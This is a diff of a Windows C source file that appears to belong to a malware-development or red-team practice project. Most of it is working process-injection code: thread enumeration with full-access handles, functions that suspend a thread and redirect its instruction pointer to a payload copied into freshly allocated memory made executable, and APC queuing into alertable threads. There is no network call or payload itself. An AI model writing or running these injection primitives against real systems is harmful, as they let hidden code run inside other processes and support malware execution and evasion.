@@ -1,5 +1,71 @@
 #include "SystemInteraction.h"
 
+VOID AlertableFunction0(void)
+{
+	SleepEx(100, TRUE);
+	printf("[!] APC \"Sleep Ex\" Fired Back!\n");
+
+}
+
+VOID AlertableFunction1(void)
+{
+	HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+	if (hEvent) 
+	{
+		WaitForSingleObjectEx(hEvent, 150, TRUE);
+		CloseHandle(hEvent);
+	}
+	printf("[!] APC \"Wait For Single Objects Ex\" Fired Back!\n");
+
+}
+
+VOID AlertableFunction2()
+{
+	HANDLE hEvent = CreateEvent(NULL,FALSE, FALSE, NULL);
+	if (hEvent) {
+		WaitForMultipleObjectsEx(
+			1, &hEvent,
+			TRUE,
+			150, TRUE);
+		CloseHandle(hEvent);
+	}
+	printf("[!] APC \"Wait For Multiple Objects Ex\" Fired Back!\n");
+}
+
+VOID AlertableFunction3(void)
+{
+
+	HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+	if (hEvent) {
+		MsgWaitForMultipleObjectsEx(
+			1, &hEvent, 
+			150, QS_KEY, 
+			MWMO_ALERTABLE//This line is a must.
+		);
+		CloseHandle(hEvent);
+	}
+	printf("[!] APC \"Msg Wait For Multiple Objects Ex\" Fired Back!\n");
+}
+
+VOID AlertableFunction4()
+{
+
+	HANDLE hEvent1 = CreateEvent(NULL, NULL, NULL, NULL);
+	HANDLE hEvent2 = CreateEvent(NULL, NULL, NULL, NULL);
+
+	if (hEvent1 && hEvent2) {
+		SignalObjectAndWait(
+			hEvent1, hEvent2, 
+			150, 
+			TRUE 
+		); 		
+		CloseHandle(hEvent1);
+		CloseHandle(hEvent2);
+	}
+	printf("[!] APC \"Signal Object And Wait\" Fired Back!\n");
+
+}
+
 
 VOID BenignFunction
 (
@@ -9,6 +75,23 @@ VOID BenignFunction
 	int x;
 	if (5 + 5 == 10) x = 12;
 	Sleep(x * 1000);
+}
+
+BOOLEAN CreateLocalAlertableThread
+(
+       OUT PHANDLE phThread,
+	   OUT PDWORD  pdwThreadId
+)
+{
+	if (!CreateThread(
+		THREAD_SET_CONTEXT,
+		0,
+		(LPTHREAD_START_ROUTINE)AlertableFunction0,
+		NULL,
+		CREATE_SUSPENDED, 
+		pdwThreadId)) return FALSE;
+
+	return TRUE;
 }
 
 BOOLEAN CreateSacrificialThread
@@ -73,7 +156,7 @@ BOOLEAN CreateSuspendedProcess
 	return TRUE;
 }
 
-BOOLEAN EnumProcNTQuerySystemInformation
+BOOLEAN EnumProcessNTQuerySystemInformation
 (
 	IN     LPCWSTR szProcName,
 	   OUT PDWORD  pdwPid,
@@ -113,8 +196,8 @@ BOOLEAN EnumProcNTQuerySystemInformation
 BOOLEAN EnumRemoteProcessHandle
 (
 	IN        LPWSTR   szProcName,
-	IN OUT    PDWORD   pdwPID,
-	IN OUT    HANDLE  *phProcess
+	   OUT    PDWORD   pdwPID,
+	   OUT    HANDLE  *phProcess
 )
 {
 	if (!szProcName || !pdwPID || !phProcess) return FALSE;
@@ -152,176 +235,6 @@ BOOLEAN EnumRemoteProcessHandle
 	}
 
 	return bState;
-}
-
-BOOLEAN FetchLocalThreadHandle
-(
-	IN     DWORD   dwMainThreadId,
-	OUT PDWORD  pdwTargetThreadId,
-	OUT PHANDLE phTagetThread
-)
-{
-	HANDLE        hSnapshot;
-	BOOLEAN       bState = FALSE;
-	DWORD         dwProcessId = GetCurrentProcessId();
-	THREADENTRY32 th32ThreadEntry_t = { .dwSize = sizeof(THREADENTRY32) };
-
-
-	if (
-		(hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)) == INVALID_HANDLE_VALUE
-		) goto cleanup;
-	if (
-		!Thread32First(hSnapshot, &th32ThreadEntry_t)
-		) goto cleanup;
-	do {
-		if (!th32ThreadEntry_t.th32OwnerProcessID) continue;
-
-		if (
-			th32ThreadEntry_t.th32OwnerProcessID == dwProcessId && th32ThreadEntry_t.th32ThreadID != dwMainThreadId) goto success;
-
-	} while (Thread32Next(hSnapshot, &th32ThreadEntry_t));
-
-	goto cleanup;
-
-success:
-	if (
-		!(*phTagetThread = OpenThread(THREAD_ALL_ACCESS, FALSE, th32ThreadEntry_t.th32ThreadID))
-		) goto cleanup;
-
-	*pdwTargetThreadId = th32ThreadEntry_t.th32ThreadID;
-
-	printf("[+] Found A Target Local Thread!\nTID: %lu\n", *pdwTargetThreadId);
-
-	bState = TRUE;
-cleanup:
-	if (hSnapshot != INVALID_HANDLE_VALUE) CloseHandle(hSnapshot);
-
-	return bState;
-}
-
-BOOLEAN FetchProcess
-(
-	IN     LPWSTR pProcessName,
-	   OUT PDWORD dwProcessId,
-	   OUT PHANDLE phProcessHandle
-)
-{
-	if (!pProcessName || !dwProcessId || !phProcessHandle) return FALSE;
-
-	HANDLE hSnapshot;
-	BOOLEAN bState = FALSE;
-	PROCESSENTRY32 pe32Process = { .dwSize = sizeof(PROCESSENTRY32) };
-
-	if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE) goto _cleanup;
-
-	if (!Process32First(hSnapshot, &pe32Process)) goto _cleanup;
-
-	do
-	{
-		if (_wcsicmp(pe32Process.szExeFile, pProcessName) == 0)
-		{
-			*phProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32Process.th32ProcessID);
-			*dwProcessId = pe32Process.th32ProcessID;
-			bState = TRUE;
-			goto _cleanup;
-		}
-	} while (Process32Next(hSnapshot, &pe32Process));
-
-_cleanup:
-	if (hSnapshot) CloseHandle(hSnapshot);
-	return bState;
-}
-
-BOOLEAN HijackThread
-(
-	IN     HANDLE hThread,
-	IN     PUCHAR pPayloadAddress
-)
-{
-	if (!pPayloadAddress || !hThread) return FALSE;
-
-	SuspendThread(hThread);
-
-	CONTEXT cThreadContext_t = { .ContextFlags = CONTEXT_CONTROL };
-
-	if (!GetThreadContext(hThread, &cThreadContext_t)) return FALSE;
-
-	cThreadContext_t.Rip = (ULONGLONG)pPayloadAddress;
-
-	if (!SetThreadContext(hThread, &cThreadContext_t)) return FALSE;
-
-	ResumeThread(hThread);
-
-	WaitForSingleObject(hThread, INFINITE);
-
-	return TRUE;
-}
-
-BOOLEAN HijackLocalThread
-(
-	IN     HANDLE hThread, 
-	IN     PUCHAR pPayloadAdress,
-	IN     SIZE_T sPayloadSize
-)
-{
-	if (!hThread || !pPayloadAdress || !sPayloadSize) return FALSE;
-
-	CONTEXT cThreadCOntext_t = {.ContextFlags =  CONTEXT_CONTROL};
-	
-	if (!GetThreadContext(hThread, &cThreadCOntext_t))
-	{
-		SuspendThread(hThread);
-		if (!GetThreadContext(hThread, &cThreadCOntext_t))return FALSE;
-	}
-
-	PVOID   pExecutionAddress;
-	DWORD   dwOldProtections;
-
-	if (!(pExecutionAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;
-
-	memcpy(pExecutionAddress, pPayloadAdress, sPayloadSize);
-
-	cThreadCOntext_t.Rip = (ULONGLONG)pExecutionAddress;
-
-	if (!SetThreadContext(hThread, &cThreadCOntext_t)) return  FALSE;
-
-	if (!VirtualProtect(pExecutionAddress, sPayloadSize, PAGE_EXECUTE_READ , &dwOldProtections)) return FALSE;
-
-	if (ResumeThread(hThread) == -1) return FALSE;
-
-	WaitForSingleObject(hThread, INFINITE);
-	
-	return TRUE;
-}
-
-//Test
-INT8 CheckVM()
-{
-
-	fnNtQuerySystemInformation   pNtQuerySystemInformation;
-
-	if (!(pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(
-		GetModuleHandleA("NTDLL.DLL"),
-		"NtQuerySystemInformation"))) return - 1;
-
-	SYSTEM_INFORMATION_CLASS SysInfo = SystemCodeIntegrityInformation;
-	ULONG Len1, Len2 = 0;
-
-	
-	pNtQuerySystemInformation(SystemCodeIntegrityInformation, NULL, 0, &Len1);
-
-	SYSTEM_CODEINTEGRITY_INFORMATION SysCII = { Len1 };
-	if(pNtQuerySystemInformation(SysInfo, &SysCII, Len1, &Len2) != 0)
-	{
-		return - 2;
-	}
-
-	for (UCHAR i = 0; i < 32; i++)
-	{
-		if (SysCII.CodeIntegrityOptions & (1 << i)) printf("[i] Found Code Integrity Information Option Number: %x\n", (1 << i));
-	}
-	getchar();
-	return 0;
 }
 
 BOOLEAN FetchDrives
@@ -391,14 +304,184 @@ LPWIN32_FIND_DATA_ARRAYW FetchFileArrayW
 	return pFiles_arr_t;
 }
 
-LPWIN32_FIND_DATA_ARRAYW RefetchFilesArrayW
+BOOLEAN FetchLocalAllertableThread
 (
-	IN     LPWSTR pPath,
-	   OUT LPWIN32_FIND_DATA_ARRAYW pFiles_arr_t 
+	IN     DWORD   dwMainThreadId,
+	   OUT PDWORD  pdwAlertedThreadId,
+	   OUT PHANDLE phAlertedThreadHandle
 )
 {
-	FreeFileArray(pFiles_arr_t);
-	return FetchFileArrayW(pPath);
+	if (!dwMainThreadId || !pdwAlertedThreadId || !phAlertedThreadHandle) return FALSE;
+
+	HANDLE hSnapshot;
+
+	DWORD dwMainProcessId = GetCurrentProcessId();
+
+	if (!dwMainProcessId) return FALSE;
+
+	if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, GetCurrentProcessId())) == INVALID_HANDLE_VALUE) return FALSE;
+
+	THREADENTRY32 th32ThreadEtnry_t = { .dwSize = sizeof(THREADENTRY32) };
+
+	if (!Thread32First(hSnapshot, &th32ThreadEtnry_t)) return FALSE;
+	BOOLEAN bState = FALSE;
+	do
+	{
+		if (dwMainProcessId == th32ThreadEtnry_t.th32OwnerProcessID && dwMainThreadId != th32ThreadEtnry_t.th32ThreadID)
+		{
+			HANDLE hCandidateThread = INVALID_HANDLE_VALUE;
+			if ((hCandidateThread = OpenThread(THREAD_SET_CONTEXT, FALSE, th32ThreadEtnry_t.th32ThreadID)) == INVALID_HANDLE_VALUE) return FALSE;
+			if (QueueUserAPC(
+				(PAPCFUNC)AlertableFunction0
+				, hCandidateThread, 0))
+			{
+				*phAlertedThreadHandle = hCandidateThread;
+				*pdwAlertedThreadId = th32ThreadEtnry_t.th32ThreadID;
+				bState = TRUE;
+				QueueUserAPC(
+					(PAPCFUNC)AlertableFunction1
+					, hCandidateThread, 0);
+
+				SleepEx(150, TRUE);
+				QueueUserAPC(
+					(PAPCFUNC)AlertableFunction2
+					, hCandidateThread, 0);
+				SleepEx(150, TRUE);
+
+				QueueUserAPC(
+					(PAPCFUNC)AlertableFunction3
+					, hCandidateThread, 0);
+				SleepEx(150, TRUE);
+
+				QueueUserAPC(
+					(PAPCFUNC)AlertableFunction4
+					, hCandidateThread, 0);
+
+				break;
+			}
+		}
+	}
+	while (Thread32Next(hSnapshot, &th32ThreadEtnry_t));
+
+	CloseHandle(hSnapshot);
+	return bState;
+}
+BOOLEAN FetchLocalThreadHandle
+(
+	IN     DWORD   dwMainThreadId,
+	   OUT PDWORD  pdwTargetThreadId,
+	   OUT PHANDLE phThreadHandle
+)
+{
+	HANDLE        hSnapshot;
+	BOOLEAN       bState = FALSE;
+	DWORD         dwProcessId = GetCurrentProcessId();
+	THREADENTRY32 th32ThreadEntry_t = { .dwSize = sizeof(THREADENTRY32) };
+
+
+	if (
+		(hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)) == INVALID_HANDLE_VALUE
+		) goto cleanup;
+	if (
+		!Thread32First(hSnapshot, &th32ThreadEntry_t)
+		) goto cleanup;
+	do {
+		if (!th32ThreadEntry_t.th32OwnerProcessID) continue;
+
+		if (
+			th32ThreadEntry_t.th32OwnerProcessID == dwProcessId && th32ThreadEntry_t.th32ThreadID != dwMainThreadId) goto success;
+
+	} while (Thread32Next(hSnapshot, &th32ThreadEntry_t));
+
+	goto cleanup;
+
+success:
+	if (
+		!(*phThreadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, th32ThreadEntry_t.th32ThreadID))
+		) goto cleanup;
+
+	*pdwTargetThreadId = th32ThreadEntry_t.th32ThreadID;
+
+	printf("[+] Found A Target Local Thread!\nTID: %lu\n", *pdwTargetThreadId);
+
+	bState = TRUE;
+cleanup:
+	if (hSnapshot != INVALID_HANDLE_VALUE) CloseHandle(hSnapshot);
+
+	return bState;
+}
+
+BOOLEAN FetchProcess
+(
+	IN     LPWSTR  pProcessName,
+	   OUT PDWORD  dwProcessId,
+	   OUT PHANDLE phProcessHandle
+)
+{
+	if (!pProcessName || !dwProcessId || !phProcessHandle) return FALSE;
+
+	HANDLE hSnapshot;
+	BOOLEAN bState = FALSE;
+	PROCESSENTRY32 pe32Process = { .dwSize = sizeof(PROCESSENTRY32) };
+
+	if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE) goto _cleanup;
+
+	if (!Process32First(hSnapshot, &pe32Process)) goto _cleanup;
+
+	do
+	{
+		if (_wcsicmp(pe32Process.szExeFile, pProcessName) == 0)
+		{
+			*phProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32Process.th32ProcessID);
+			*dwProcessId = pe32Process.th32ProcessID;
+			bState = TRUE;
+			goto _cleanup;
+		}
+	} while (Process32Next(hSnapshot, &pe32Process));
+
+_cleanup:
+	if (hSnapshot) CloseHandle(hSnapshot);
+	return bState;
+}
+
+BOOLEAN FetchRemoteThreadHandle
+(
+	IN     DWORD   dwProcessId, 
+	   OUT PDWORD  pdwThreadId,
+	   OUT PHANDLE phThreadHandle
+)
+{
+	if (!dwProcessId || !pdwThreadId || !phThreadHandle) return FALSE;
+
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessId);
+
+	if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
+
+	BOOLEAN bState = FALSE;
+
+	THREADENTRY32 th32Thread_t = { .dwSize = sizeof(THREADENTRY32) };
+	
+	if (!Thread32First(hSnapshot, &th32Thread_t)) goto cleanup;
+
+	do
+	{
+
+		if (th32Thread_t.th32OwnerProcessID == dwProcessId)
+		{
+			*pdwThreadId    = th32Thread_t.th32ThreadID;
+			*phThreadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, *pdwThreadId);
+			if (!*phThreadHandle) goto cleanup;
+			bState = TRUE;
+			break;
+		}
+
+	} while (Thread32Next(hSnapshot, &th32Thread_t));
+
+cleanup:
+
+	CloseHandle(hSnapshot);
+
+	return bState;
 }
 
 BOOLEAN FetchResource
@@ -432,3 +515,88 @@ BOOLEAN FetchResource
 
 	return TRUE;
 }
+
+BOOLEAN HijackThread
+(
+	IN     HANDLE hThread,
+	IN     PUCHAR pPayloadAddress
+)
+{
+	if (!pPayloadAddress || !hThread) return FALSE;
+
+	SuspendThread(hThread);
+
+	CONTEXT cThreadContext_t = { .ContextFlags = CONTEXT_CONTROL };
+
+	if (!GetThreadContext(hThread, &cThreadContext_t)) return FALSE;
+
+	cThreadContext_t.Rip = (ULONGLONG)pPayloadAddress;
+
+	if (!SetThreadContext(hThread, &cThreadContext_t)) return FALSE;
+
+	ResumeThread(hThread);
+
+	WaitForSingleObject(hThread, INFINITE);
+
+	return TRUE;
+}
+
+BOOLEAN HijackLocalThread
+(
+	IN     HANDLE hThread, 
+	IN     PUCHAR pPayloadAdress,
+	IN     SIZE_T sPayloadSize
+)
+{
+	if (!hThread || !pPayloadAdress || !sPayloadSize) return FALSE;
+
+	CONTEXT cThreadCOntext_t = {.ContextFlags =  CONTEXT_CONTROL};
+	
+	if (!GetThreadContext(hThread, &cThreadCOntext_t))
+	{
+		SuspendThread(hThread);
+		if (!GetThreadContext(hThread, &cThreadCOntext_t))return FALSE;
+	}
+
+	PVOID   pExecutionAddress;
+	DWORD   dwOldProtections;
+
+	if (!(pExecutionAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;
+
+	memcpy(pExecutionAddress, pPayloadAdress, sPayloadSize);
+
+	cThreadCOntext_t.Rip = (ULONGLONG)pExecutionAddress;
+
+	if (!SetThreadContext(hThread, &cThreadCOntext_t)) return  FALSE;
+
+	if (!VirtualProtect(pExecutionAddress, sPayloadSize, PAGE_EXECUTE_READ , &dwOldProtections)) return FALSE;
+
+	if (ResumeThread(hThread) == -1) return FALSE;
+
+	WaitForSingleObject(hThread, INFINITE);
+	
+	return TRUE;
+}
+
+
+VOID TestAllertAbleThread
+(
+	HANDLE hAlertableThreadHandle
+)
+{
+	for (unsigned short i = 0; i < 1000; i++)
+	{
+		if (!QueueUserAPC((PAPCFUNC)AlertableFunction1, hAlertableThreadHandle, i)) break;
+		SleepEx(120, TRUE);
+	}
+}
+LPWIN32_FIND_DATA_ARRAYW RefetchFilesArrayW
+(
+	IN     LPWSTR pPath,
+	   OUT LPWIN32_FIND_DATA_ARRAYW pFiles_arr_t 
+)
+{
+	FreeFileArray(pFiles_arr_t);
+	return FetchFileArrayW(pPath);
+}
+ 
